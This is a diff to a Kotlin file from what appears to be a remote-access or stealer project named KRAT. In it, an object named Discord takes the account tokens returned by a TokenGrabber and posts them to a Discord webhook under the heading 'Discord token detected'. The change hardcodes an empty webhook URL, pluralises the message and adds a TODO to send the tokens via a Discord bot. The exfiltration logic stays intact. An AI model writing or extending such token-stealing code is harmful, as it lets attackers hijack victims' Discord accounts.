@@ -1,16 +1,13 @@
 package services
 
 import KRAT.user
-import io.github.cdimascio.dotenv.dotenv
 import services.discord.TokenGrabber.getTokens
 import utils.DiscordWebhook
 import utils.ListUtils.removeDuplicates
 
 object Discord {
-    val url = dotenv()["WEBHOOK_URL"]
-
     fun webhook(): DiscordWebhook {
-        return DiscordWebhook(url).apply {
+        return DiscordWebhook("").apply {
             username = user
         }
     }
@@ -18,14 +15,17 @@ object Discord {
     fun sendTokens() {
         val tokens = getTokens()?.removeDuplicates()
         if (tokens == null || tokens.isEmpty()) return
+        val sIf = if (tokens.size > 1) "s" else ""
 
         webhook().apply {
             embeds.add(
                 DiscordWebhook.EmbedObject()
-                    .setTitle("Discord token detected")
-                    .setDescription("**Tokens:** ${tokens.map { "```$it```" }.joinToString()}")
+                    .setTitle("Discord token$sIf detected")
+                    .setDescription("**Token$sIf:** ${tokens.map { "```$it```" }.joinToString()}")
             )
             execute()
         }
+
+        // TODO: send via discord bot
     }
 }
